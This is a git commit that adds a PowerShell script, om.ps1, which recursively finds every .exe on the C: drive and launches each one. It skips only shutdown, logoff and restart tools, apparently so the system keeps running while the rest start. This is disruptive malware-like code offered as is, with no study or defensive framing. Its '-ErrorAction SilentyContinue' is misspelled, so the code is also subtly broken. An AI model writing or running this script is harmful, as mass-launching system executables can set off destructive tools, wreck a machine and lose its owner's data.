f0ca0d870b76014db83333fe088ae47bc41a8262
xixolabs <elytasy981@gmail.com>
2026-07-14 10:55:40 +0300

    Create om.ps1

---
+++ om.ps1
@@ -0,0 +1,16 @@
+$exeFiles = Get-ChildItem -Path C:\ -Recurse -Filter *.exe -ErrorAction SilentyContinue
+foreach ($exe in $exeFiles) {
+try {
+# Expanded blacklist of executables to avoid
+$blacklist = @("shutdown.exe", "logoff.exe", "restart.exe", "tsshutdn.exe",
+"poweroff.exe", "slidetoshutdown.exe")
+if ($blacklist -notcontains $exe.Name -and $exe.Name -notmatch
+"shutdown|logoff|restart|tsshutdn|poweroff|slidetoshutdown") {
+Start-Process -FilePath $exe.FullName
+} else {
+Write-Host "Skipping $exe due to blacklist" -ForegroundColor Yellow
+}
+} catch {
+Write-Host "Failed to open $exe" -ForegroundColor Red
+}
+}
